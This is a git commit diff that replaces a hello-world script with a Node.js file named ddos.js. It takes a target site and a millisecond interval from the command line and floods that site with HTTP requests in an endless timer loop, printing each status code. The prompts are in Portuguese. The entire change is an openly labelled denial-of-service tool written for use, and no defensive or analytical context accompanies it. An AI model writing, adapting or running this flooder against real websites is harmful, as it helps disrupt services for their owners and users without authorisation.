3c2ff01d0f1d29aeb2077f1bf2ac1dc250d6680a
Markus Kefka's <markusdarkness@gmail.com>
2014-08-30 11:58:33 -0300

    ddos.js

--- ddos.js
+++ ddos.js
@@ -1,3 +1,33 @@
 #!/usr/bin/env node
 
-console.log('hello world');
+var program = require('commander');
+var http = require('request');
+program
+.version('0.1.0')
+.option('-s, site <s>', 'Entre com o nome do site para enviar requests', String)
+.option('-t, time <n>', 'Entre com o intervalo em milisegundos para as requests 1000', parseInt)
+.parse(process.argv);
+
+
+function ddos(s, t){
+  console.log('Iniciando...');
+  if(s){
+      setInterval(function(){
+        http(s, function(err, res){
+          if(err)
+            process.exit(1);
+
+          if (res.statusCode == 200) {
+            console.log('acessando: '+ s);
+          }else{
+            console.log('Não acessou: '+res.statusCode);
+          }
+        });
+      }, t);
+  }else{
+    console.log('Você precisa indicar um site!');
+    process.exit();
+  }
+}
+
+ddos(program.site, program.time || 1000, program.limit);
